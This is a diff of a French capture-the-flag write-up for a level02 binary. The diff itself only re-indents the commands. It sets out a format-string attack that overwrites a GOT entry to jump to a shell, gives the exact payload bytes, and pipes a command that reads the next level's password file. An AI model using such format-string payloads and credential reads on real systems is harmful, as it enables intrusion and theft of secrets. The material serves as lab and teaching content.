@@ -25,5 +25,5 @@ les 4 derniers a l'addresse dans le main qui ouvre un shell, avec le printf
 Notre chaine d'attaque seras donc:
 %8$n[4196972 octets de padding]%9$n\n[addresse de la GOT + 4][addresse de la GOT]\n
 
-$ echo -en "%8\$n%4196972d%9\$n\n\xe4\x11\x60\x00\x00\x00\x00\x00\xe0\x11\x60\x00\x00\x00\x00\x00\n" > /tmp/in
-$ (cat /tmp/in; echo "cat /home/users/level03/.pass") | ./level02
+	$ echo -en "%8\$n%4196972d%9\$n\n\xe4\x11\x60\x00\x00\x00\x00\x00\xe0\x11\x60\x00\x00\x00\x00\x00\n" > /tmp/in
+	$ (cat /tmp/in; echo "cat /home/users/level03/.pass") | ./level02
